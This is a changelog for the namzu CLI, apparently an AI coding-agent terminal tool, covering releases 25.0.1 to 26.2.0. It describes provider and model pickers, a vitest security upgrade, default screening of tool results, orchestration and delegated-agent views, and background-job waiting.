  begins with the space Ink broke at, and the footer says what `esc` does —
  `esc cancel` returns to the session behind the picker, `esc exit namzu` closes
  the program, which is what it did all along with nothing behind it.

## 26.2.0

### Minor Changes

- ca56e24: The provider picker lists every provider you can set up, not only the ones it
  detected on this machine.

  The gap was reported from a session where it cost something: the saved provider
  was OpenRouter, the picker drew the four providers discovery had found, and
  OpenRouter was not among them — so there was no row to select and therefore no
  way to type the key that was already in hand. A list assembled from `detected`
  cannot name a provider `detected` does not mention, whatever the operator is
  holding.

  Detected rows are untouched: same order, same numbering, same source column
  (`Claude session · this device`), same place at the top, and the header's count
  still counts exactly what it counted before. Below them, under `Not detected —
enter a credential to use these:`, come every provider this build can construct
  that takes a typed credential — `anthropic`, `google`, `openai`, `deepseek`,
  `openrouter`, `zen`, `zen-go` — each marked with the environment variable that
  sets it up (`needs OPENROUTER_API_KEY`), because that variable is both what
  makes the provider work now and what keeps it working after a restart.

  Enter on one of those rows opens the paste field for that provider, and `k`
  follows the highlighted row instead of a fixed choice in the registry. Where the
  row takes no typed credential — a local server, or a provider that signs in —
  `k` still falls back to the provider the picker was opened for, which is the
  saved one whose key is missing, so the route the notice above the list
  advertises is unchanged. A typed credential is still held for the session and
  written nowhere; nothing about how a credential is resolved at run time changed,
  and no config key was added.

  **What moves, and why it is not a patch.** The footer now names a provider only
  when `k` reaches past the highlighted row to the one the picker was opened for.
  With the cursor on the row the key will act on, the line reads `k enter a
credential`; the label returns as `k enter a credential for <provider>` exactly
  when the two differ. That is shorter than the sentence it replaces — long enough
  to wrap and lose its tail on a 100-column terminal — but it is a change to a
  line a script or a reader may have matched, which is why this is `minor` rather
  than `patch`. Two smaller consequences, both stated because they are visible:
  the list is longer, so a machine with seven of these rows draws a taller screen,
  and the digit shortcut still reaches the first nine rows only (a tenth needs two
  keystrokes, and two keystrokes cannot be told from two presses without a timer),
  which the screen now says out loud when the list passes nine.

  Five registry entries are deliberately not offered there, because a row that
  leads nowhere is worse than an absent one. `bedrock` needs an AWS credential
  chain rather than one string; `http` is an endpoint whose base URL is half the
  credential; `lmstudio` has no driver in this build; `ollama` needs a running
  server, which is how discovery finds it; and `codex` is a device-code sign-in
  this screen already offers with `l`, so it is not set up two ways.
  `provider-list.test.ts` asserts that omission list by name, so flipping a
  registry flag turns it red rather than quietly adding or dropping a row.

  One defect was found in this screen while building it and is fixed here: the
  cursor is an index into whichever list the screen is drawing, and the sign-in
  screen draws three rows while the provider list draws more. With a saved
  preference naming `openai` and a Codex device session detected, `/login` opened
  with `openai` resolved against the provider list — row four — and read against
  the sign-in list, so no row was highlighted and Enter did nothing at all.

## 26.1.0

### Minor Changes

- 9b920fd: The model picker marks a zero-priced model `(free)`, and its search finds the
  word.

  OpenRouter's public catalogue serves 445 models and 25 of them are priced at
  zero for both input and output. The picker listed all 445 and could not tell
  you which: the listing it built dropped the price the driver had already
  parsed. A row now carries `(free)` when its listing reported `0` for both
  prices, and `free` in the search box returns those rows — including the ones
  whose ID and display name never spell the word, which is how
  `google/lyria-3-pro-preview` becomes findable at all. Nothing is reordered or
  hidden: the provider's order is the screen's order, and the marker only adds
  words to a row that was already there.

  **This changes what the search matches**, and that is why it is not a patch.
  The filter is documented as matching a row's ID and display name; it now also
  matches the note beside the row. Everything that matched before still matches
  identically — the same words, the same order, the same rows returned by
  identity — but a query can return more than it did. Typing `default` finds the
  row marked `(namzu default)`, and `free` finds every row marked `(free)`,
  where before both matched only rows whose ID or name happened to contain the
  word. Nothing needs to be done about it unless you drive this screen from a
  script that assumed a query's result set; if you do, the new matches are
  additive, so a result you were using is still in it.

  It is not a `major` because no exported symbol, CLI flag, config key, default
  or wire shape moved. `ModelListing`'s `ok` arm gained two optional fields —
  optional deliberately, since `ModelInfo` requires both prices and a required
  price is one a driver has to invent — and the picker is a screen, not an API.

  One thing to know before you trust the badge. The note reports what the
  provider's own listing said about its own catalogue, and a driver that reports
  zero for every model it lists gets a list marked free wholesale. Four drivers
  in this repository do exactly that today (`anthropic`'s live path, `openai`,
  `codex`, `deepseek`); the fix is to make the price optional in `ModelInfo` and
  have those drivers omit it, the way `9d6c482c` did for `contextWindow`, and
  that is an SDK change with its own bump rather than part of this one.

### Patch Changes

- e83dfe5: The model picker marks a row `(free)` only when the provider reported both rates as zero, and says nothing about a model whose rate nobody published.

  Both halves are the fix. Reading `0` as free is right, and it is now readable: `ModelInfo`'s two price fields are optional, so a driver with no rate omits them rather than writing the zero that made every paid model on four provider menus look free.

  The catalogue block under `agent_models` prints a price fact: the rates when the driver published them, `Free` when it reported zero, and `Price unknown` when it published nothing. `Price unknown` is the rendering that did not exist — had absence been given the obvious one it would have printed `$0.00`, which is the same sentence as `Free` to a reader.

  The `(free)` marker also survives a narrow terminal. `Picker` rebuilds a row's notes from a fixed vocabulary under 70 columns and drops any word missing from it, so `(free)` had to be added there or it would have been silently discarded on exactly the screens where the row is hardest to read.

- Updated dependencies [e83dfe5]
- Updated dependencies [e83dfe5]
- Updated dependencies [e83dfe5]
- Updated dependencies [e5411cc]
- Updated dependencies [9661d16]
  - @namzu/ollama@2.2.4
  - @namzu/sdk@43.0.0
  - @namzu/anthropic@6.0.0
  - @namzu/openai@4.0.0
  - @namzu/deepseek@2.0.0
  - @namzu/google@1.0.0
  - @namzu/openrouter@3.0.0
  - @namzu/computer-use@1.4.3

## 26.0.1

### Patch Changes

- 8d5223b: Nothing a consumer installs or calls changes, and that is the whole of this
  release. `vitest` moves from `^3.2.6` to `^4.1.11` in the `devDependencies` of
  all nineteen packages that declared it, and `@vitest/coverage-v8` moves with it
  in `@namzu/sdk`. Every occurrence is a devDependency — checked, not assumed —
  so `dependencies`, `peerDependencies`, exports, types, defaults and the wire
  shape are untouched, and the published tarballs differ from the previous
  release only in `package.json#devDependencies`.

  The reason is a security fix with no 3.x backport. `GHSA-82fw-gwwq-j7x9`
  ("Path Traversal / Arbitrary File Read via `@vitest/mocker` Redirect Mock")
  covers `vitest` and `@vitest/mocker` from `2.1.0` up to `4.1.11`, so `^3.2.6`
  can only be resolved by leaving the 3.x line. `4.1.11` is the first patched
  release and is what the lockfile now resolves for both.

  What this costs anyone who works on the repository rather than with it: the
  upgrade was not a version bump. Vitest 4 changed test discovery, coverage
  configuration, mock construction and reporter output, and each of those broke
  something here that had to be migrated rather than worked around. Those fixes
  are all under `__tests__/`, `vitest.config.ts` files and `scripts/`, none of
  which is published, which is why this is a patch and not a major.

  You do not need to do anything. If you pin `vitest` yourself to run this
  project's own suites, note that the config files it ships are now written for
  `>= 4.1.11` and will not run under 3.x.

- Updated dependencies [175dab2]
- Updated dependencies [8d5223b]
  - @namzu/sdk@42.0.2
  - @namzu/anthropic@5.1.2
  - @namzu/computer-use@1.4.3
  - @namzu/deepseek@1.2.1
  - @namzu/files@1.1.1
  - @namzu/google@0.3.1
  - @namzu/ollama@2.2.3
  - @namzu/openai@3.1.2
  - @namzu/openrouter@2.4.1
  - @namzu/zen@2.1.1

## 26.0.0

### Major Changes

- b0314ca: Tool results are screened by default, and `toolResultScreens` is how an operator changes that — including a per-tool exception

  A stream that connects a tool server can have a result refused before the model reads it: an answer that IS the request — the tool handed back the call instead of an answer to it — fails the call with the reason in place of the output. On a project that connects servers whose tools echo their arguments, that is a visible change to a run, which is why this is a major and not a minor.

  **Keep the old behaviour with one key:**

  ```json
  { "toolResultScreens": [] }
  ```

  The key has three answers rather than two. Absent runs the kernel's default; `[]` runs nothing; `["injection"]`, `["correspondence"]` or both run exactly those, in the order written. Absent and `[]` are kept apart on purpose — a screen can refuse a result, so an unconfigured run and a run whose operator turned screening off must not mean the same thing. An unknown screen name is refused as an invalid config value rather than ignored, so a typo cannot silently leave a screen uninstalled.

  **The screen stays on by default, and the per-tool exception is a config key.** A legitimate tool answering more broadly than asked is normal — a normaliser, a validator, a search that repeats its query when it found nothing, a fetch whose page body is its own URL — and a screen that refuses those gets switched off, at which point it protects nothing. So an entry in the list may be an object carrying that screen's options, and the exception lives beside the screen:

  ```json
  {
    "toolResultScreens": [
      {
        "name": "correspondence",
        "passthroughTools": ["mcp_weather-co_lookup"]
      }
    ]
  }
  ```

  `passthroughTools` names the tools exempt from the correspondence screen, and a tool answers to more than one name — the registered `mcp_weather-co_lookup`, the server's own `lookup`, and `weather-co:lookup` all work; a plugin-contributed `myplugin__mcp__weather__lookup` answers to `lookup` and `weather:lookup` but NOT to `mcp_weather_lookup`. A name that matches no tool this session mounts is reported on launch — `toolResultScreens: "x" names no tool this session mounts, so it exempts nothing` — rather than silently exempting nothing. An option the named screen does not read is refused at load, like every other value in that file.

  **What the default does not touch.** This process's own tools that frame nothing: `web_fetch` returns a page body, and a page whose body is the URL it was fetched from is a true result from a working tool, so the correspondence screen judges results carrying the untrusted frame. An empty result, a failed call, and a result that is not a string are left alone as well. The CLI has no key for the screen's own `scope`; a host that wants its unframed tools judged writes SDK code.

  **The key now reaches the interactive session.** It reached the headless surfaces — `run`, `run-stream`, `drain`, ACP, the resident step — and was dropped on the way to the TUI, which is the surface most operators use: the App's `TuiContext` did not carry it and `hydrateSession` did not pass it. Every surface named above now applies the operator's answer, and a test drives `runCli` and the App to prove the two hops rather than asserting them.

### Patch Changes

- Updated dependencies [4e8cf5c]
- Updated dependencies [19abb2c]
- Updated dependencies [565ffa7]
  - @namzu/sdk@42.0.0
  - @namzu/zen@2.0.0
  - @namzu/computer-use@1.4.2
  - @namzu/anthropic@5.1.1
  - @namzu/ollama@2.2.2
  - @namzu/openai@3.1.1
  - @namzu/openrouter@2.4.0

## 25.1.0

### Minor Changes

- 3ff9027: Agent rows in the delegated-work rail, the agent cockpit and a child's transcript header now show the resolved child model and live token/tool-call counters when a host reported them: cumulative spend compacted to `42.1k`/`1.38M` and a `· N tools` count. Spend is the child's cumulative `token_usage_updated` usage, never its current context size — a different, shrinking number that would otherwise make a long-running child look like it was spending far more than it was. A child that has not yet reported usage shows an em dash rather than `0`, since "unknown" and "spent nothing" are different facts. On a narrow terminal the counters are dropped first, then the model name; the description is never truncated to make room for either, and a resolved model id long enough to threaten that (a self-hosted or gateway-style id can run well past a typical short name) is itself capped to a short label with an ellipsis rather than left to crowd the description out.

  Minor, not patch: this is new operator-visible capability, not a fix. `SubagentActivity` (the type these fields were added to) is internal to `@namzu/cli`'s own TUI and is not exported from the package's public entry, so no published type changed shape for a consumer.

- ea82bd8: List past and running orchestration runs with `/agents runs`, a third
  subcommand beside `/agents running` and `/agents available`.

  Each row is one parent turn that delegated at least one child: its name, when
  it started, the phases its children reported, agents done/total, tokens spent
  and elapsed time — the same shape `/jobs` prints, newest run first. A run still
  going is read straight from the live monitor; a finished one is read cheaply
  from disk, one `run.json` per child, without opening any child's transcript.
  A finished run has no `workflow` label to show — that annotation never
  survives a restart — so its name is the opening words of the parent turn
  instead; a live run still shows its `workflow` label when one was set. The
  listing is capped at 20 rows, newest first, with an omitted count beyond that,
  matching the delegation-history archive's own bound. An empty history says so
  in words rather than opening an empty picker, and `/agents` with an
  unrecognised subcommand still shows usage.

  Enter opens the selected run in the same cockpit `Ctrl+T` opens, landing
  directly on the first agent's transcript — so a finished run's `Replayed from
saved evidence. This child cannot be continued.` banner is the first thing on
  screen, and nothing on it offers to message or cancel work that already ended
  in another process.

  Additive: a new subcommand and a new optional `listOrchestrationRuns()` on the
  session object the TUI already builds. Nothing existing changed.

- ea130bc: New optional `eraProbeTimeoutMs` on an `mcpServers` entry, letting one server override how long its era probe (`server/discover`, sent before the legacy `initialize` handshake) waits before falling back — validated like `connectTimeoutMs` and refused rather than silently defaulted when given but not a positive number of milliseconds. Useful for a stdio server known to be old and slow to connect: shortening the probe leaves more of `connectTimeoutMs` for the handshake that will actually answer. Unconfigured servers are unaffected — the SDK's own default and clamp apply exactly as before.

  [Tool servers](../docs/cli/mcp-servers.md#the-era-probe) also documents the era probe's operator-visible cost for the first time: one extra round trip on first contact per origin or resolved command, cached afterward, and the probe's own timeout once against a legacy server old enough to stay silent on it.

- 380691e: The composer footer now sits directly under the message frame in every case, and the automatic agent rail — the panel that used to be titled "Delegated work" — no longer uses that literal title.

  Before: the render order below the message frame was frame → delegated-work rail (when agents were live) → footer, so the footer's row depended on whether a rail was drawn between it and the frame. The rail's title, and the agent cockpit's per-workflow header, fell back to the literal string `Delegated work` whenever no single explicit `workflow` label covered every agent shown — including the ordinary case of agents that never set one.

  Now: the order below the frame is frame → footer → the rail (or, in its place, the agent cockpit, a child transcript, or the tool-output viewer). The footer is always the row immediately after the message frame's bottom border, whether or not anything follows it. The rail's title is the workflow label every one of its agents shares; when they carry none, or carry more than one, the title is a neutral count instead — `2 agents · 1 running` — never the generic "Delegated work" name. The agent cockpit's header follows the same rule. Each row of the cockpit's own workflow picker (`ctrl+t` with two or more groups live or retained) follows it too: an unlabelled group is named after its own lead agent instead, so two unlabelled groups no longer render as identical "Delegated work" rows. The right-hand side of the rail is unchanged (`N active · M total · ↓ / ctrl+t`).

  Nothing about permission-mode behavior, the footer's own content rules, or agent scheduling changed — only where the rail draws relative to the footer, and what its title says when no workflow was named. Minor, not patch: an operator with agents running sees a different screen layout, and any workflow that never sets an explicit label now reads a different title in the rail and the cockpit — a terminal-automation script or screenshot keyed to either no longer matches.

- d0227e2: The CLI's MCP client connections now negotiate against a broader set of legacy MCP protocol revisions (via `@namzu/sdk`'s `MCPClient`), so an MCP server that had negotiated to `2025-03-26`, `2025-06-18` or `2025-11-25` — refused outright before this release — now connects normally. No CLI-owned config key, flag or default changes; this is an operator-visible improvement (more MCP servers connect) delivered through the SDK dependency bump, not a change to anything the CLI itself declares as its own surface. Minor rather than major on that basis.
- 5663108: Every MCP server the CLI connects to is now asked `server/discover` at MCP `2026-07-28` before the legacy `initialize` handshake is offered (via `@namzu/sdk`'s `MCPClient`), so a server that only speaks the 2026-07-28 revision — which has no `initialize` at all — connects for the first time.

  **What an operator observes.** One extra round trip on first contact per HTTP origin or per stdio command, then nothing: the resolved era is cached for the process. Against a server that answers an unknown method with an error, that is a round trip's latency. Against one that ignores unknown methods entirely it is the SDK's `eraProbeTimeoutMs`, 2 seconds by default; measured against a real child process of that kind, `mcp add`-style connects finish in about 2s, well inside the CLI's unchanged 10s `connectTimeoutMs`. No CLI-owned flag, config key or default changes — as with the legacy-era broadening two releases ago, this is an operator-visible improvement delivered through the SDK dependency rather than a change to anything the CLI declares as its own surface, which is what makes it minor rather than major.

- c0aeab2: The permission mode and the model/effort identity now share a single dim line directly below the message frame, instead of two separately-positioned indicators.

  Before: the active permission mode (when it differed from `prompt`) was drawn as its own row _inside_ the message frame, above the `›` input, growing the frame from three rows to four; the model, reasoning effort and working directory sat on a wholly separate status line, one blank row further down, with the interaction hint or durable goal on its right.

  Now: one footer line, always present, immediately below the frame (the frame is a constant three rows). Left to right: the permission-mode badge, colored by mode, with its `(shift+tab to cycle)` reminder when the mode differs from `prompt` — or, in `prompt` mode, a quiet `shift+tab to cycle` in its place; a reasoning-effort override beside it as `· effort <level>`, only when the operator has set one (the previous line's unconditional `<model> default` is gone — an unset effort is no longer named); the working directory. On the right: the interaction hint or durable goal exactly as before, or — when neither is active — the model identity, which moved here from the left. The footer stays exactly one row at every width: on narrow screens the working directory shrinks and drops first (a path is recoverable, the mode is not), then the effort label, then the cycle-key reminder, then the model on the right, and only as a last resort does the mode badge itself truncate.

  Nothing about what a mode does, or its name, changed — only where and how it is drawn. `PermissionMode`, `permissionModeLabel` and the Shift+Tab cycle order (`prompt` → `accept-edits` → `plan` → `prompt`) are untouched, and neither `Composer` nor `StatusBar` is part of this package's public entry point (`packages/cli/src/index.ts`) — a consumer importing `@namzu/cli` as a library sees no type or export change at all.

  Minor, not patch: an operator running `namzu` sees a different screen on every launch — the mode fact and the identity fact move to a line neither used to share, an unset reasoning effort is no longer implied to be `default`, and a screenshot, recording or terminal-automation script keyed to the old two-indicator layout no longer matches. That is a behavior change worth a changelog entry even though no importable type moved.

- 449642e: Add `/orchestrate`, a session mode layered above reasoning effort rather than inside it.

  `@namzu/cli`: `/orchestrate [on|off]` (no argument toggles) turns the mode on or off for the current session. It is deliberately not a `ReasoningEffort` value — typing `/effort orchestrate` still reports "unavailable for this model", exactly as `ultracode` does today. When the `/effort` picker can open, the mode also appears there as its own row below a rule, apart from the model's own levels. Turning the mode on pins reasoning effort to the model's highest published level and strengthens delegation guidance for future turns toward delegating by default; when the model publishes no exact effort menu the mode still turns on and still strengthens guidance, but pins nothing and says so. Like effort, the mode is in-memory and per-session — nothing is written to preferences. A model switch still resets an explicit effort override to the new model's default, but while the mode is on it re-pins to the new model's highest level instead. The status line shows the level and the mode together (`effort high · orchestrate`), or the mode alone when nothing is pinned — never a fabricated effort value.

  `@namzu/sdk`: `codingAgentDoctrineContribution` gains an optional `orchestrate` field on `CodingAgentDoctrineOptions`, and a new exported `CODING_AGENT_ORCHESTRATE_DOCTRINE` constant. Passing `orchestrate: true` (and leaving `delegation` at its default) appends that text after the existing delegation doctrine. Leaving the new field unset — the only behavior any existing caller can observe — renders byte-identical output to before this field existed. No default changed and no export was renamed or removed, so this is additive for every current consumer.

- b58b8ae: The parent can now write a line of commentary above the agent rail, through a
  new `narrate_work` tool.

  While several agents are running, the rail says what each one is doing but
  nothing says why — which phase just came back, what disagreed, what happens
  next. `narrate_work` takes one `line` and shows it directly above the rail,
  outside its border, in the run's own voice. It changes nothing: no task is
  started, corrected, stopped or re-ordered, and no surface reads the line back.

  Bounded on purpose, because the rows it spends are the most valuable on the
  screen: the three most recent lines stay, a further line drops the oldest, each
  line is one row clipped at 200 characters with a marker saying so, a blank line
  is refused, and the whole band is cleared when the conversation is reset. Text
  longer than twice a row is not a line and is refused rather than reduced to its
  opening clause. A session that never calls it renders exactly as it did before
  — no heading, no separator, no reserved row — and the band never costs the
  agent rail a row: the rail's height budget is computed from the terminal's own
  rows, and on a full screen the band's rows are paid for by the conversation
  scrolling at the top, the way every row this interface adds is paid for.

  The call is not reviewed: it declares itself read-only because it starts,
  changes and stops nothing — no file of its own, no request, no task — and a
  consent dialog per line of commentary, shown to the operator being asked, is a
  tool nobody would call. `send_message` and `cancel_agent`, which do reach into a
  running child, are reviewed exactly as before. A successful call adds no
  transcript row either — the line is already on screen — while a refused one
  keeps its row, since nothing was shown.

  The tool is mounted only in the interactive terminal, where somebody is there
  to read the line — the same condition `ask_user_question` is mounted under.
  `namzu run`, `namzu run --stream`, `namzu drain` and the resident step have no
  rail for a line to appear above and are not offered it, so their tool rosters
  are unchanged by this release.

  The tool is the parent's alone. It is registered on the parent conversation's
  registry beside `send_message` and `cancel_agent`, and a delegated child's
  roster carries none of them, so nothing a child writes can be rendered as the
  run's own narration. A child's output stays wrapped as untrusted, which is the
  whole reason the boundary is where it is.

  The band is in-memory only: it is cleared on reset and nothing replays it onto
  the screen after a resume. The call is not. It is recorded in the run's
  transcript and in the conversation's checkpoints like every other tool call,
  and it returns to the model's own history on `/resume` — so treat a narrated
  line as durable text about the work, not as a caption that disappears with the
  screen.

  Additive: a new tool on the roster the parent already carries, and an optional
  narration reader on the session's activity source. Nothing existing changed.

- 8463b54: The `Agent` tool accepts an optional `phase_detail` string alongside `workflow`, `phase` and `phase_order` — display-only text for a phase, exactly like its neighbours: it creates no dependencies, barriers or serial execution. The first agent to declare a phase's detail sets it; a later sibling in the same phase cannot change it, so concurrent children with slightly different wording never make the pane flicker.

  In the agent cockpit (Ctrl+T / `/agents`), a phase's detail is revealed beneath the phase list only while that phase carries the cursor — the other phases show none, and a phase with no detail renders exactly as it did before this change, with no reserved blank space. The text wraps to the pane width and is clipped to a fixed line budget, so the pane's height never depends on how long the detail is. The compact approval plan and its detailed pager (`permission-review.ts`) now surface the same text, so the plan an operator approves and the cockpit they inspect afterward agree.

  Minor, not patch: this is new operator-visible capability. `SubagentActivity` and `AgentPhase` (the internal types that gained `phaseDetail`/`detail`) are not exported from `@namzu/cli`'s public entry, so no published type changed shape for a consumer.

- 3e6980d: Open a finished delegated child from the evidence it already writes to disk.

  **`@namzu/sdk`** gains one static method and the type it returns:
  `RunDiskStore.listChildren(baseDir, parentRunId)` and `DelegatedChildRun`. It
  walks `<baseDir>/<parentRunId>/children/`, reads each child's `run.json`, and
  reports the run id, its directory, and whatever the file recorded of the agent,
  the model, the status, the timings and the token total. Every field from the
  file is optional: `run.json` is written on a run's terminal path, so a child
  killed before it got there leaves a transcript worth reading and no recorded
  ending, and absent means "the file did not say" rather than zero.

  Additive. Nothing existing changed, and in particular **`listRuns` is
  unchanged** — do not read this as a fix to the index. `addToIndex` still
  returns early for any run with a `parentRunId`, so a delegated child still
  never appears in the browsable catalogue, which is what keeps it out of a
  host's conversation listing. `listChildren` is the separate read for a caller
  that wants the evidence anyway. It performs no writes: binding a `RunDiskStore`
  to a run creates that run's directory, which is why discovery is a static walk
  and not a bound method.

  **`@namzu/cli`** can now open a delegated child that is no longer live — evicted
  by the activity monitor's eighty-agent bound, or left behind by a process that
  has since exited. The agent cockpit lists it from disk and drills into its saved
  transcript, rebuilt through the same projection a live child renders through, so
  the past and the present look alike.

  It cannot be continued, and the screen says so: a replayed row is marked `saved`,
  its transcript is headed `Replayed from saved evidence. This child cannot be
continued.`, it never appears in the live panel above the composer, and there is
  no message or cancel affordance on it. Resume has never restarted delegated
  tasks or reconnected their processes, and opening one does not either. Replay is
  read-only — no file is written, moved or pruned by looking at a past run — and a
  torn transcript opens with the records that could be read plus a row saying it is
  partial; one that cannot be read at all opens with that row alone, beside what
  `run.json` recorded, rather than dropping the child from the list.

  Two limits worth knowing before relying on it. Streaming deltas never enter a
  run's durable log, so a replayed transcript carries tool calls, their results and
  any failure text but not the assistant prose that streamed between them; the
  child's `report.md` holds its answer. Delegation lifecycle events enter no log
  either, so a replayed child's `workflow` and `phase` labels are not recovered:
  saved children are grouped by the parent run they belonged to and carry the
  unlabelled default workflow, as a live child launched without labels does.

  Child run directories accumulate and nothing prunes them. That predates this
  change — the directories were always written — but this is what makes the growth
  visible. Reclaiming the space today means deleting `children/` directories by
  hand; a prune command is follow-up work.

- 35cbc02: A correction queued with `send_message` was previously invisible: the child's transcript jumped straight from one tool call to a visibly redirected next turn, and the parent saw only a one-line "queued" acknowledgement that scrolled away. Once delivery is confirmed (never for a refused or unowned send), it now appears on both sides: the child's transcript gets a `← from parent: …` row using the existing system-row kind, and the main conversation gets a matching `<description> · correction sent` row with the message text beneath it. Each side shows the message exactly once, however many times the surface re-renders.

  Minor, not patch: this is new operator-visible capability. `SubagentActivityMonitor.recordMessage()` and the `direction` field it adds to a transcript row are internal to the CLI, not exported from `@namzu/cli`'s public entry, so no published type changed shape for a consumer.

### Patch Changes

- bd32216: Delegation display labels now ride the `agent_pending` event. `RunEvent`'s `agent_pending` variant, `CreateTaskOptions` and `SendMessageOptions` each gain optional `workflow`, `phase`, `phaseDetail` and `phaseOrder`, and the SSE bridge carries them on `agent.pending` as `workflow`, `phase`, `phase_detail` and `phase_order`.

  **These are display annotations only; they do not create dependencies, barriers, or serial execution.** Nothing in the kernel reads them back: admission, capacity, ordering and concurrency are decided by the scheduler, and two children naming the same phase are not thereby sequenced, synchronised or joined. `planId`/`planStepId` remain the delegation fields that carry correlation a host may act on. A reader who infers execution structure from a label here has inferred it from a caption.

  What they buy is reach. A label that stays in the delegating process's memory is visible to that process and to nothing else; on the event it reaches every listener the delegation was given, and through `mapRunToStreamEvent` the SSE wire, so a consumer watching from elsewhere rebuilds the same grouping instead of seeing an undifferentiated list of children.

  **Reach is not durability, and this does not add persistence.** Delegation lifecycle events are handed straight to a host's listener without passing through the run's event translator, so `agent_pending` enters no run's log — which is what the absent `seq` on these variants has always meant. A label supplied here is written nowhere by the kernel and does not survive a restart; a host that wants the grouping to outlive its process records it from the listener, into whatever store it already keeps.

  Minor, and nothing to do on the upgrade: every field is optional and absent unless a host supplies one, no export was removed or renamed, no union narrowed, no default changed. A host that supplies none sees byte-identical events and wire payloads. The A2A bridge continues to emit nothing for delegation events — deliberately, and now said so in its comment: a peer models one task lifecycle and has no screen of ours to caption.

  The CLI change is behaviour-preserving (`patch`): the `Agent` tool sends the labels it already collected down onto the delegation, and its activity monitor reads them off the event with the launch-time values kept as the seed, so a child that fails before `agent_pending` still groups where it was launched. For a run supplying the same labels on both paths — which is every CLI run — the grouping is byte-identical to before.

- 1391ab8: The composer footer's `· orchestrate` marker no longer disappears at narrow terminal widths while orchestrate mode stays silently on.

  Before: `orchestrate` was appended to the reasoning-effort label as one droppable unit (`effort <level> · orchestrate`, or `orchestrate` alone with no effort pinned) inside `StatusBar.tsx`'s `fitStatusLine`. That unit was dropped for room right after the working directory, well before the model — so at 40 columns, a real PTY run with orchestrate mode on and no effort menu open showed only `shift+tab to cycle       gpt-5.6-terra`: no `orchestrate` anywhere on screen, with the permission-mode badge (or its quiet reminder) and the model both still shown. Orchestrate is a persistent, behavior-changing session setting — it pins effort to the model's highest level and strengthens delegation guidance for every later turn — with no other on-screen indicator, so an operator working in a narrow pane had no way to tell it was on.

  Now: `orchestrate` is its own segment, no longer bundled with `effort`, and it holds the same survival priority as the permission-mode badge. It is dropped only after the working directory, the effort label, the cycle-key reminder and the model are already gone, and only as a last resort — never truncated to a fragment of the word, and never at the cost of shrinking the badge itself to make room for it. At 100 columns the line is unaffected. At 40 columns with orchestrate on, the footer now reads `shift+tab to cycle · orchestrate` (or the equivalent with an active permission badge) instead of naming neither.

  Patch, not minor: no prop, export or default changed shape — `StatusBar`'s existing `orchestrate` prop behaves exactly as documented, just fitted with a different priority under width pressure.

- Updated dependencies [bd32216]
- Updated dependencies [c272993]
- Updated dependencies [c99f088]
- Updated dependencies [d0227e2]
- Updated dependencies [359b27f]
- Updated dependencies [5663108]
- Updated dependencies [165fd64]
- Updated dependencies [93f8d1e]
- Updated dependencies [7694a82]
- Updated dependencies [6283f8d]
- Updated dependencies [449642e]
- Updated dependencies [3e6980d]
- Updated dependencies [feaeaba]
  - @namzu/sdk@41.0.0
  - @namzu/computer-use@1.4.2
  - @namzu/anthropic@5.1.1
  - @namzu/ollama@2.2.2
  - @namzu/openai@3.1.1
  - @namzu/openrouter@2.4.0

## 25.0.1

### Patch Changes

- f33c62b: A run now suspends for a background job the model said it was waiting on, instead of settling over it. When the model stops calling tools and a job named by `wait_for_job` is still running, the run waits — no provider request, no tokens — for the job's exit, an operator message, or the settle grace, whichever comes first. On an exit the model gets one more turn with the `[Background job update]` line in front of it; on neither, the run settles and names the job.

  This is the same bounded, zero-token wait `CompletionInbox` already gave a delegated task, and it shares the delegated task's grace — half of what the run has left before it must start finishing — under a ceiling of its own: two minutes, or `NAMZU_JOB_HOLD_MAX_MS`. On a run with a `timeoutMs` the grace comes out of what is left rather than being added to it, so time a `wait_for_job` call already spent shortens the hold by the same amount. On a run WITHOUT one — no run deadline, which is what the CLI ships — there is no remainder to take a share of, and the task ceiling would be a flat hour; that hour is sound for a task, which cannot outlive it, and wrong for a job, which can run forever. The two-minute job ceiling is what bounds that case, so a `wait_for_job` that ran its own bound out is followed by two more minutes at most, not by a second hour. The iteration limit still bounds all of it, and the wait starts nothing and stops nothing.

  **Wait-intent is explicit.** Only a job `wait_for_job` named is awaited, and only for the rest of the run that named it. A job nobody waited on — a dev server, a watcher — never holds a run open, and there is no opt-in flag on `bash run_in_background` that changes that.

  **Why this is `minor` and not `major`.** The signal is new: no run that exists today can have an awaited job, because nothing before this could mark one. A host that never calls `wait_for_job` sees the loop it saw before, so no default changes and no existing behaviour is withdrawn.

  Additive API:

  - `Run.abandonedJobIds` — awaited jobs still running when the run ended, the job-side counterpart to `abandonedTaskIds`. Naming them is not stopping them: a run-owned job is still stopped by the run's own teardown, and one bound to the host's session keeps running.
  - `RUNTIME_CONTEXT_MESSAGE_KINDS` gains `'job-exit'`, the provenance on the message that carries an exit delivered by the wait. Consumers that exhaustively switch on `RuntimeContextMessageKind` need a case for it.
  - `BackgroundJobRegistryRef` gains an optional `markAwaited(id)`, and `bindOwner`'s options take an `onAwaited(id)` callback that backs it. Both are optional; a host that wires neither gets the previous behaviour, which is no hold.
  - `NAMZU_JOB_HOLD_MAX_MS` sets the job ceiling above, in milliseconds, beside the `NAMZU_JOB_WAIT_*` knobs `wait_for_job` already reads. Unset is two minutes.

- 6ae4072: The repeat-call advisory (notices, then escalates, when a tool is called with identical arguments over and over) now reaches the model even when the repeated tool's result is structured content — an image, a document, an MCP resource block — rather than plain text. `attachRepeatNotice` previously required the trailing tool result to be a string and silently dropped the notice otherwise; it now falls back to delivering the advisory as its own runtime-context message immediately after the tool-result batch. No thresholds changed, and a repeat that keeps succeeding is still only ever noticed, never refused.

  `RuntimeContextMessageKind` gains a `'repeat-call'` member for this fallback message. A consumer that exhaustively switches over the union (the CLI's transcript labeling did) needs a case for it; `@namzu/cli` adds one in this release.

- 92ab1d9: A resumed conversation keeps the file witnesses it earned. The observation ledger is process memory, and every resume path handed the run an empty one: the derived work context could admit nothing, and the first thing a resumed agent did was read back a file whose whole body was in the transcript it had just been given.

  The new export `seedObservationLedger(messages, tracker, { workingDirectory, additionalDirectories, sandboxed })` rebuilds a ledger from a conversation's own history. `resumeRun` and `query`'s checkpoint resume call it for you, from the history as repaired rather than as checkpointed, so the ledger describes exactly what the model is about to be shown; the CLI calls it the first time a turn asks for a conversation's tracker, which covers `/resume`, `namzu run --resume`/`--continue`, and a forked conversation — each seeded from its own messages, once. Call it directly if you keep a tracker per conversation and restore one yourself. Nothing is persisted and no session-store schema changes; a host that does nothing sees exactly today's behaviour.

